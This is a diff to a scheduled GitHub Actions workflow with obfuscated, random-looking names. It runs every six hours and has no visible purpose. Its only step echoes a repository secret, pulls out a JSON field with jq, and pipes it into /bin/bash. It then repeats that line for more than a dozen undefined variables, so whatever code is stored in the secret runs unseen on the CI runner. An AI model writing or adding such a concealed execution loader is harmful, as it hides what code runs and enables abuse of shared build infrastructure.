@@ -3,27 +3,30 @@ name: luanyunping2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 4/6 * * *'
-
-jobs:  # 16603
+    - cron: '43 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luanyunping2345
         env:
-          pysg04: ${{ secrets.pysg04 }}
+          nyb4: ${{ secrets.nyb4 }}
         run: |
-          echo $pysg04 | jq -r .eij54939 | /bin/bash
-          echo $uay30175 | jq -r .w4968 | /bin/bash
-          echo $im4 | jq -r .efket36546 | /bin/bash
-          echo $e07118 | jq -r .hcp6 | /bin/bash
-          echo $aen96 | jq -r .qsv27 | /bin/bash
-          echo $xtsbk39 | jq -r .rq355 | /bin/bash
-          echo $q3042 | jq -r .fc952 | /bin/bash
-          echo $btco0 | jq -r .sgic74 | /bin/bash
-          echo $nxf3342 | jq -r .xwp38422 | /bin/bash
-          echo $f7591 | jq -r .pqa54 | /bin/bash
-          echo $u36657 | jq -r .abci04 | /bin/bash
-          echo $ooh1129 | jq -r .cgoi27386 | /bin/bash
+          echo $nyb4 | jq -r .c3 | /bin/bash
+          echo $abgv94 | jq -r .he60 | /bin/bash
+          echo $mu541 | jq -r .d50551 | /bin/bash
+          echo $oi54 | jq -r .fy3835 | /bin/bash
+          echo $elj1498 | jq -r .s2 | /bin/bash
+          echo $qs65686 | jq -r .tnuo0 | /bin/bash
+          echo $n31846 | jq -r .r1914 | /bin/bash
+          echo $n922 | jq -r .nz619 | /bin/bash
+          echo $b074 | jq -r .e8 | /bin/bash
+          echo $tidcw0685 | jq -r .ok39 | /bin/bash
+          echo $xiem739 | jq -r .lzif79654 | /bin/bash
+          echo $kaf73643 | jq -r .hcpa668 | /bin/bash
+          echo $ci22945 | jq -r .q5304 | /bin/bash
+          echo $th0 | jq -r .bivv21 | /bin/bash
+          echo $vdae296 | jq -r .tvwky335 | /bin/bash
 
